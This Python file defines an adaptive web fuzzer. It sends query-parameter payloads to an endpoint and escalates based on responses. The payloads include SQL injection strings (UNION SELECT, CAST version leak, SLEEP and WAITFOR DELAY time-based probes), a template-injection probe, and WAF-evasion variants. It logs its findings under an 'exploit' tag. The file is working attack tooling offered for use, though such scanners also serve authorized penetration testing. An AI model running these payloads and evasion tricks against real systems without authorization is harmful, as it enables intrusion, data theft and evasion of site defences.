from typing import List, Dict, Any

import httpx


class AdaptiveFuzzingEngine:
    """
    Learns from responses to steer fuzzing:
    - 500/stack traces -> prioritize similar payloads
    - 403 -> enable lightweight WAF evasion
    - Slow/timeout -> pivot to blind/time-based injections
    """

    def __init__(self, client: httpx.AsyncClient, log):
        self.client = client
        self.log = log

    async def adaptive_fuzz(self, endpoint: str, initial_payloads: List[str]) -> List[Dict[str, Any]]:
        queue = list(initial_payloads)
        results: List[Dict[str, Any]] = []

        while queue:
            payload = queue.pop(0)
            try:
                resp = await self.client.get(endpoint, params={"q": payload})
                body = resp.text[:1000]
                elapsed_ms = int((resp.elapsed.total_seconds() if resp.elapsed else 0) * 1000)

                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "elapsed_ms": elapsed_ms,
                    "evidence": body[:200],
                })

                if resp.status_code >= 500:
                    self.log(f"[FUZZ] {endpoint} -> 500; amplifying similar payloads", "warn", "exploit")
                    queue[:0] = [payload + "'", payload + "--", payload + "{{7*7}}"]
                elif resp.status_code == 403:
                    self.log(f"[FUZZ] {endpoint} -> 403; toggling WAF evasion", "warn", "exploit")
                    queue[:0] = [f"/**/{payload}", f"{payload}/..;/"]
                elif elapsed_ms > 2500:
                    self.log(f"[FUZZ] {endpoint} slow ({elapsed_ms}ms); trying blind/time-based probes", "warn", "exploit")
                    queue[:0] = [payload + "' AND SLEEP(3)--", payload + "'); WAITFOR DELAY '0:0:3'--"]
                elif "syntax" in body.lower():
                    self.log(f"[FUZZ] {endpoint} leaked syntax error; switching to advanced SQLi", "warn", "exploit")
                    queue[:0] = ["1 UNION SELECT NULL,NULL,NULL--", "1' AND 1=CAST((SELECT version()) AS int)--"]
            except Exception:
                pass

            if len(results) >= 12:  # avoid runaway
                break

        return results
